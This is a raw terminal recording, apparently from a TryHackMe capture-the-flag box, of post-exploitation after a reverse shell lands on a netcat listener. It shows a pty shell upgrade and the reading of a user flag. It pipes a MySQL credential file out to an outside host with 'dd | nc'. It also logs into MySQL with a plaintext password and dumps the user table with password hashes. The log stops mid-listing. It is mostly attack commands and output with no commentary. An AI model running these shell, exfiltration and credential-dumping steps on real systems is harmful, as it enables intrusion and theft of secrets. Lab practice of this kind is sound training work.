@@ -1,0 +1,411 @@
+Script started on 2025-03-31 02:54:35+03:00 [COMMAND="rlwrap nc -lnvp 6047" TERM="xterm-256color" TTY="/dev/pts/5" COLUMNS="104" LINES="27"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [172.31.95.146] from (UNKNOWN) [172.31.80.1] 5961
+SOCKET: Shell has connected! PID: 2632
+[K[K[?2004hid[?2004l[K[?2004hid
+[Kuid=33(www-data) gid=33(www-data) groups=33(www-data)
+[K[K[?2004hpython3 -c 'import pty;pty.sopa[K[K[Kpawen[K[Kn("/bin/bash")[C[C[C[C[C[C[C[C[C[C[C[C[C'[?2004l[K[?2004hpython3 -c 'import pty;pty.spawn("/bin/bash")'
+[Kwww-data@THM-Chal:/var/www/html/content/inc/ads$ [Kwww-data@THM-Chal:/var/www/html/content/inc/ads$ [K[?2004hwww-data@THM-Chal:/var/www/html/content/inc/ads$ cd /var/www/html[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd /var/www/html
+[Kcd /var/www/html
+www-data@THM-Chal:/var/www/html$ [Kwww-data@THM-Chal:/var/www/html$ [K[?2004hwww-data@THM-Chal:/var/www/html$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[Kcontent  index.html
+www-data@THM-Chal:/var/www/html$ [Kwww-data@THM-Chal:/var/www/html$ [K[?2004hwww-data@THM-Chal:/var/www/html$ ls -al[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -al
+[Kls -al
+total 24
+drwxr-xr-x 3 root     root      4096 Nov 29  2019 .
+drwxr-xr-x 3 root     root      4096 Nov 29  2019 ..
+drwxr-xr-x 9 www-data www-data  4096 Sep 19  2016 content
+-rw-r--r-- 1 www-data www-data 11321 Nov 29  2019 index.html
+www-data@THM-Chal:/var/www/html$ [Kwww-data@THM-Chal:/var/www/html$ [K[?2004hwww-data@THM-Chal:/var/www/html$ cd /home[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd /home
+[Kcd /home
+www-data@THM-Chal:/home$ [Kwww-data@THM-Chal:/home$ [K[?2004hwww-data@THM-Chal:/home$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[Kitguy
+www-data@THM-Chal:/home$ [Kwww-data@THM-Chal:/home$ [K[?2004hwww-data@THM-Chal:/home$ cd it  [?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd it	
+[Kcd it[Kcd it[Kcd itguy/
+www-data@THM-Chal:/home/itguy$ [Kwww-data@THM-Chal:/home/itguy$ [K[?2004hwww-data@THM-Chal:/home/itguy$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[KDesktop    Downloads  Pictures	Templates  backup.pl	     mysql_login.txt
+Documents  Music      Public	Videos	   examples.desktop  user.txt
+www-data@THM-Chal:/home/itguy$ [Kwww-data@THM-Chal:/home/itguy$ [K[?2004hwww-data@THM-Chal:/home/itguy$ cat user.txt[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat user.txt
+[Kcat user.txt
+[KTHM{63e5bce9271952aad1113b6f1ac28a07}
+www-data@THM-Chal:/home/itguy$ [Kwww-data@THM-Chal:/home/itguy$ [K[?2004hwww-data@THM-Chal:/home/itguy$ dd if [K=[7mmysql_login.txt[27mmysql_login.txt status=progress | nc 10.8.6user.txt[K[K[K[K[K[K[K[K1.245 4444[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hdd if=mysql_login.txt status=progress | nc 10.8.61.245 4444
+[Kdd if=mysql_login.txt status=progress | nc 10.<uy$ dd if=mysql_login.txt status=progress | nc 10.8                         .61.245 4444
+[K0+1 records in
+0+1 records out
+16 bytes copied, 0.000350139 s, 45.7 kB/s
+[Kwww-data@THM-Chal:/home/itguy$ [Kwww-data@THM-Chal:/home/itguy$ [K[?2004hwww-data@THM-Chal:/home/itguy$ ls -al[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -al
+[Kls -al
+total 148
+drwxr-xr-x 18 itguy itguy 4096 Nov 30  2019 .
+drwxr-xr-x  3 root  root  4096 Nov 29  2019 ..
+-rw-------  1 itguy itguy 1630 Nov 30  2019 .ICEauthority
+-rw-------  1 itguy itguy   53 Nov 30  2019 .Xauthority
+lrwxrwxrwx  1 root  root     9 Nov 29  2019 .bash_history -> /dev/null
+-rw-r--r--  1 itguy itguy  220 Nov 29  2019 .bash_logout
+-rw-r--r--  1 itguy itguy 3771 Nov 29  2019 .bashrc
+drwx------ 13 itguy itguy 4096 Nov 29  2019 .cache
+drwx------ 14 itguy itguy 4096 Nov 29  2019 .config
+drwx------  3 itguy itguy 4096 Nov 29  2019 .dbus
+-rw-r--r--  1 itguy itguy   25 Nov 29  2019 .dmrc
+drwx------  2 itguy itguy 4096 Nov 29  2019 .gconf
+drwx------  3 itguy itguy 4096 Nov 30  2019 .gnupg
+drwx------  3 itguy itguy 4096 Nov 29  2019 .local
+drwx------  5 itguy itguy 4096 Nov 29  2019 .mozilla
+-rw-------  1 itguy itguy  149 Nov 29  2019 .mysql_history
+drwxrwxr-x  2 itguy itguy 4096 Nov 29  2019 .nano
+-rw-r--r--  1 itguy itguy  655 Nov 29  2019 .profile
+-rw-r--r--  1 itguy itguy    [K-rw-r--r--  1 itguy itguy    [K-rw-r--r--  1 itguy itguy    0 Nov 29  2019 .sudo_as_admin_successful
+-rw-r-----  1 itguy itguy    5 Nov 30  2019 .vboxclient-clipboard.pid
+-rw-r-----  1 itguy itguy    5 Nov 30  2019 .vboxclient-display.pid
+-rw-r-----  1 itguy itguy    5 Nov 30  2019 .vboxclient-draganddrop.pid
+-rw-r-----  1 itguy itguy    5 Nov 30  2019 .vboxclient-seamless.pid
+-rw-------  1 itguy itguy   82 Nov 30  2019 .xsession-errors
+-rw-------  1 itguy itguy   82 Nov 29  2019 .xsession-errors.old
+drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Desktop
+drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Documents
+drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Downloads
+drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Music
+drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Pictures
+drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Public
+drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Templates
+drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Videos
+-rw-r--r-x  1 root  root    47 Nov 29  2019 backup.pl
+-rw-r--r--  1 itguy itguy 8980 Nov 29  2019 examples.desktop
+-rw-rw-r--  1 itguy itguy   16 Nov 29  2019 mysql_login.txt
+-rw-rw-r--  1 itguy itguy   38 Nov 29  2019 user.txt
+www-data@THM-Chal:/home/itguy$ [Kwww-data@THM-Chal:/home/itguy$ [K[?2004hwww-data@THM-Chal:/home/itguy$ sudo [K[K[K[K[Kcat backup.pl[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat backup.pl
+[Kcat backup.pl
+[K#!/usr/bin/perl
+
+system("sh", "/etc/copy.sh");
+www-data@THM-Chal:/home/itguy$ [Kwww-data@THM-Chal:/home/itguy$ [K[?2004hwww-data@THM-Chal:/home/itguy$ mysql -u rice -p[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hmysql -u rice -p
+[Kmysql -u rice -p
+[KEnter password: [KEnter password: [K[?2004hEnter password: randompass[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hrandompass
+[K
+[KWelcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 28
+Server version: 5.7.28-0ubuntu0.16.04.2 (Ubuntu)
+
+Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> [Kmysql> [K[?2004hmysql> sele[K[K[K[Kshow dsa[K[Katabases:[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[K[?2004hshow databases:
+[Kshow databases:
+    -> [K    -> [K[?2004h    -> ;[?2004l[C[C[C[C[C[C[C[K[?2004h;
+[K;
+[KERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ':' at line 1
+mysql> [Kmysql> [K[?2004hmysql> show databases:[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[K[?2004hshow databases:
+[Kshow databases:
+    -> [K    -> [K[?2004h    -> ;[?2004l[C[C[C[C[C[C[C[K[?2004h;
+[K;
+ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ':' at line 1
+mysql> [Kmysql> [K[?2004hmysql> show databases;[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[K[?2004hshow databases;
+[Kshow databases;
+[K+--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
+| website            |
++--------------------+
+5 rows in set (0.08 sec)
+
+mysql> [Kmysql> [K[?2004hmysql> use website[Ke;[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[K[?2004huse website;
+[Kuse website;
+[KReading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> [Kmysql> [K[?2004hmysql> show tables;[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[K[?2004hshow tables;
+[Kshow tables;
++-------------------+
+| Tables_in_website |
++-------------------+
+| v_attachment      |
+| v_category        |
+| v_comment         |
+| v_item_data       |
+| v_item_plugin     |
+| v_links           |
+| v_options         |
+| v_posts           |
++-------------------+
+8 rows in set (0.00 sec)
+
+mysql> [Kmysql> [K[?2004hmysql> use mysql;\[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[K[?2004huse mysql;\
+[Kuse mysql;\
+[KReading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+[KDatabase changed
+mysql> [Kmysql> [K[?2004hmysql> show tables;[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[K[?2004hshow tables;
+[Kshow tables;
++---------------------------+
+| Tables_in_mysql           |
++---------------------------+
+| columns_priv              |
+| db                        |
+| engine_cost               |
+| event                     |
+| func                      |
+| general_log               |
+| gtid_executed             |
+| help_category             |
+| help_keyword              |
+| help_relation             |
+| help_topic                |
+| innodb_index_stats        |
+| innodb_table_stats        |
+| ndb_binlog_index          |
+| plugin                    |
+| proc                      |
+| procs_priv                |
+| proxies_priv              |
+| server_cost               |
+| servers                   |
+| slave_master_info         |
+| slave_relay_log_info      |
+| slave_worker_info         |
+| slow_log                  |
+| tables_priv               |
+| time_zone                 |
+| time_zone_leap_second     |
+| time_zone_name            |
+| time_zone_transition      |
+| time_zone_transi[K| time_zone_transi[K| time_zone_transition_type |
+| user                      |
++---------------------------+
+31 rows in set (0.00 sec)
+
+mysql> [Kmysql> [K[?2004hmysql> select * from user;[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[K[?2004hselect * from user;
+[Kselect * from user;
++-----------+------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-----------------------+-------------------------------------------+------------------+-----------------------+-------------------+----------------+
+| Host      | User             | Select_priv | Insert_priv | Update_priv | Delete_priv | Create_priv | Drop_priv | Reload_priv | Shutdown_priv | Process_priv | File_priv | Grant_priv | References_priv | Index_priv | Alter_priv | Show_db_priv | Super_priv | Create_tmp_table_priv | Lock_tables_priv | Execute_priv | Repl_slave_priv | Repl_client_priv | Create_view_priv | Show_view_priv | Create_routine_priv | Alter_routine_priv | Create_user_priv | Event_priv | Trigger_priv | Create_tablespace_priv | ssl_type | ssl_cipher | x509_issuer | x509_subject | max_questions | max_updates | max_connections | max_user_connections | plugin                | authentication_string                     | password_expired | password_last_changed | password_lifetime | account_locked |
++-----------+------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-----------------------+-------------------------------------------+------------------+-----------------------+-------------------+----------------+
+| localhost | root             | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 | auth_socket           |                                           | N                | 2019-11-29 11:31:43   |              NULL | N              |
+| localhost | mysql.session    | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | Y          | N                     | N                | N            | N               | N                | N                | N              | N                   | N                  | N                | N          | N            | N                      |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE | N                | 2019-11-29 11:31:43   |              NULL | Y              |
+| localhost | mysql.sys        | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                | N                | N              | N                   | N                  | N                | N          | N            | N                      |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE | N                | 2019-11-29 11:31:43   |              NULL | Y              |
+| localhost | debian-sys-maint | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password | *3019E4E8DD650FB34630905C671A167F0C1A44A2 | N                | 2019-11-29 11:31:44   |              NULL | N              |
+| localhost | rice             | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password | *B84104A192B95A261926419CCF2533AAAC03AF6C | N                | 2019-11-29 12:28:40   |              NULL | N              |
++-----------+------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+-[K[A[K+-----------+------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+-[K[A[K+-----------+------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-----------------------+-------------------------------------------+------------------+-----------------------+-------------------+----------------+
+5 rows in set (0.00 sec)
+
+mysql> [Kmysql> [K[K[?2004hmysql> [Kmysql> [Kmysql> [Kmysql> [Kmysql> [Kmysql> [Kmysql> [Kmysql> [Kmysql> [Kmysql> [Kmysql> [Kmysql> [Kmysql> [Kmysql> [Kmysql> [Kmysql> ++[K[K[Kmysql> [Kmysql> [Kmysql> [Kmysql> [Kmysql> [Kmysql> [Kmysql> show abl[K[K[Ktables;[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[K[?2004hshow tables;
+[Kshow tables;
++---------------------------+
+| Tables_in_mysql           |
++---------------------------+
+| columns_priv              |
+| db                        |
+| engine_cost               |
+| event                     |
+| func                      |
+| general_log               |
+| gtid_executed             |
+| help_category             |
+| help_keyword              |
+| help_relation             |
+| help_topic                |
+| innodb_index_stats        |
+| innodb_table_stats        |
+| ndb_binlog_index          |
+| plugin                    |
+| proc                      |
+| procs_priv                |
+| proxies_priv              |
+| server_cost               |
+| servers                   |
+| slave_master_info         |
+| slave_relay_log_info      |
+| slave_worker_info         |
+| slow_log                  |
+| tables_priv               |
+| time_zone                 |
+| time_zone_leap_second     |
+| time_zone_name            |
+| time_zone_transition      |
+| time_zone_transi[K| time_zone_transi[K| time_zone_transition_type |
+| user                      |
++---------------------------+
+31 rows in set (0.00 sec)
+
+mysql> [Kmysql> [K[?2004hmysql> show databses[K[K[Kases;[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[K[?2004hshow databases;
+[Kshow databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
+| website            |
++--------------------+
+5 rows in set (0.00 sec)
+
+mysql> [Kmysql> [K[?2004hmysql> use website;[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[K[?2004huse website;
+[Kuse website;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+[KDatabase changed
+mysql> [Kmysql> [K[?2004hmysql> show tables;[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[K[?2004hshow tables;
+[Kshow tables;
++-------------------+
+| Tables_in_website |
++-------------------+
+| v_attachment      |
+| v_category        |
+| v_comment         |
+| v_item_data       |
+| v_item_plugin     |
+| v_links           |
+| v_options         |
+| v_posts           |
++-------------------+
+8 rows in set (0.00 sec)
+
+mysql> [Kmysql> [K[?2004hmysql> use mysql;[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[K[?2004huse mysql;
+[Kuse mysql;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+[KDatabase changed
+mysql> [Kmysql> [K[?2004hmysql> show tables;[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[K[?2004hshow tables;
+[Kshow tables;
++---------------------------+
+| Tables_in_mysql           |
++---------------------------+
+| columns_priv              |
+| db                        |
+| engine_cost               |
+| event                     |
+| func                      |
+| general_log               |
+| gtid_executed             |
+| help_category             |
+| help_keyword              |
+| help_relation             |
+| help_topic                |
+| innodb_index_stats        |
+| innodb_table_stats        |
+| ndb_binlog_index          |
+| plugin                    |
+| proc                      |
+| procs_priv                |
+| proxies_priv              |
+| server_cost               |
+| servers                   |
+| slave_master_info         |
+| slave_relay_log_info      |
+| slave_worker_info         |
+| slow_log                  |
+| tables_priv               |
+| time_zone                 |
+| time_zone_leap_second     |
+| time_zone_name            |
+| time_zone_transition      |
+| time_zone_transi[K| time_zone_transi[K| time_zone_transition_type |
+| user                      |
++---------------------------+
+31 rows in set (0.00 sec)
+
+mysql> [Kmysql> [K[K[?2004hmysql> selee[Kct * from user;[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[K[?2004hselect * from user;
+[Kselect * from user;
++-----------+------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-----------------------+-------------------------------------------+------------------+-----------------------+-------------------+----------------+
+| Host      | User             | Select_priv | Insert_priv | Update_priv | Delete_priv | Create_priv | Drop_priv | Reload_priv | Shutdown_priv | Process_priv | File_priv | Grant_priv | References_priv | Index_priv | Alter_priv | Show_db_priv | Super_priv | Create_tmp_table_priv | Lock_tables_priv | Execute_priv | Repl_slave_priv | Repl_client_priv | Create_view_priv | Show_view_priv | Create_routine_priv | Alter_routine_priv | Create_user_priv | Event_priv | Trigger_priv | Create_tablespace_priv | ssl_type | ssl_cipher | x509_issuer | x509_subject | max_questions | max_updates | max_connections | max_user_connections | plugin                | authentication_string                     | password_expired | password_last_changed | password_lifetime | account_locked |
++-----------+------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-----------------------+-------------------------------------------+------------------+-----------------------+-------------------+----------------+
+| localhost | root             | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 | auth_socket           |                                           | N                | 2019-11-29 11:31:43   |              NULL | N              |
+| localhost | mysql.session    | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | Y          | N                     | N                | N            | N               | N                | N                | N              | N                   | N                  | N                | N          | N            | N                      |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE | N                | 2019-11-29 11:31:43   |              NULL | Y              |
+| localhost | mysql.sys        | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                | N                | N              | N                   | N                  | N                | N          | N            | N                      |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE | N                | 2019-11-29 11:31:43   |              NULL | Y              |
+| localhost | debian-sys-maint | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password | *3019E4E8DD650FB34630905C671A167F0C1A44A2 | N                | 2019-11-29 11:31:44   |              NULL | N              |
+| localhost | rice             | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password | *B84104A192B95A261926419[K[A[K[A[K[A[K[A[K[A[K[A[K| localhost | rice             | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password | *B84104A192B95A261926419[K[A[K[A[K[A[K[A[K[A[K[A[K| localhost | rice             | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password | *B84104A192B95A261926419CCF2533AAAC03AF6C | N                | 2019-11-29 12:28:40   |              NULL | N              |
++-----------+------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-----------------------+-------------------------------------------+------------------+-----------------------+-------------------+----------------+
+5 rows in set (0.00 sec)
+
+mysql> [Kmysql> [K[K[?2004hmysql> [Kmysql> [Kmysql> [Kmysql> [Kmysql> [Kmysql> [Kmysql> [Kmysql> [Kmysql> [Kmysql> [Kmysql> [Kmysql> [Kmysql> [Kmysql> [Kmysql> [Kmysql> [Kmysql> [Kmysql> [Kmysql> [Kmysql> [Kmysql> exit[?2004l[C[C[C[C[C[C[C[K[?2004hexit
+[Kexit
+Bye
+www-data@THM-Chal:/home/itguy$ [Kwww-data@THM-Chal:/home/itguy$ [K[?2004hwww-data@THM-Chal:/home/itguy$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+Desktop    Downloads  Pictures	Templates  backup.pl	     mysql_login.txt
+Documents  Music      Public	Videos	   examples.desktop  user.txt
+www-data@THM-Chal:/home/itguy$ [Kwww-data@THM-Chal:/home/itguy$ [K[?2004hwww-data@THM-Chal:/home/itguy$ cd Desktop[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd Desktop
+[Kcd Desktop
+www-data@THM-Chal:/home/itguy/Desktop$ [Kwww-data@THM-Chal:/home/itguy/Desktop$ [K[?2004hwww-data@THM-Chal:/home/itguy/Desktop$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[Kwww-data@THM-Chal:/home/itguy/Desktop$ [Kwww-data@THM-Chal:/home/itguy/Desktop$ [K[?2004hwww-data@THM-Chal:/home/itguy/Desktop$ ls -al[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -al
+[Kls -al
+total 8
+drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 .
+drwxr-xr-x 18 itguy itguy 4096 Nov 30  2019 ..
+www-data@THM-Chal:/home/itguy/Desktop$ [Kwww-data@THM-Chal:/home/itguy/Desktop$ [K[?2004hwww-data@THM-Chal:/home/itguy/Desktop$ cd ..[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd ..
+[Kcd ..
+www-data@THM-Chal:/home/itguy$ [Kwww-data@THM-Chal:/home/itguy$ [K[?2004hwww-data@THM-Chal:/home/itguy$ ls -al[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -al
+[Kls -al
+total 148
+drwxr-xr-x 18 itguy itguy 4096 Nov 30  2019 .
+drwxr-xr-x  3 root  root  4096 Nov 29  2019 ..
+-rw-------  1 itguy itguy 1630 Nov 30  2019 .ICEauthority
+-rw-------  1 itguy itguy   53 Nov 30  2019 .Xauthority
+lrwxrwxrwx  1 root  root     9 Nov 29  2019 .bash_history -> /dev/null
+-rw-r--r--  1 itguy itguy  220 Nov 29  2019 .bash_logout
+-rw-r--r--  1 itguy itguy 3771 Nov 29  2019 .bashrc
+drwx------ 13 itguy itguy 4096 Nov 29  2019 .cache
+drwx------ 14 itguy itguy 4096 Nov 29  2019 .config
+drwx------  3 itguy itguy 4096 Nov 29  2019 .dbus
+-rw-r--r--  1 itguy itguy   25 Nov 29  2019 .dmrc
+drwx------  2 itguy itguy 4096 Nov 29  2019 .gconf
+drwx------  3 itguy itguy 4096 Nov 30  2019 .gnupg
+drwx------  3 itguy itguy 4096 Nov 29  2019 .local
+drwx------  5 itguy itguy 4096 Nov 29  2019 .mozilla
+-rw-------  1 itguy itguy  149 Nov 29  2019 .mysql_history
+drwxrwxr-x  2 itguy itguy 4096 Nov 29  2019 .nano
+-rw-r--r--  1 itguy itguy  655 Nov 29  2019 .profile
+-rw-r--r--  1 itguy itguy    [K-rw-r--r--  1 itguy itguy    [K-rw-r--r--  1 itguy itguy    0 Nov 29  2019 .sudo_as_admin_successful
+-rw-r-----  1 itguy itguy    5 Nov 30  2019 .vboxclient-clipboard.pid
+-rw-r-----  1 itguy itguy    5 Nov 30  2019 .vboxclient-display.pid
+-rw-r-----  1 itguy itguy    5 Nov 30  2019 .vboxclient-draganddrop.pid
+-rw-r-----  1 itguy itguy    5 Nov 30  2019 .vboxclient-seamless.pid
+-rw-------  1 itguy itguy   82 Nov 30  2019 .xsession-errors
+-rw-------  1 itguy itguy   82 Nov 29  2019 .xsession-errors.old
+drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Desktop
+drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Documents
+drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Downloads
+drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Music
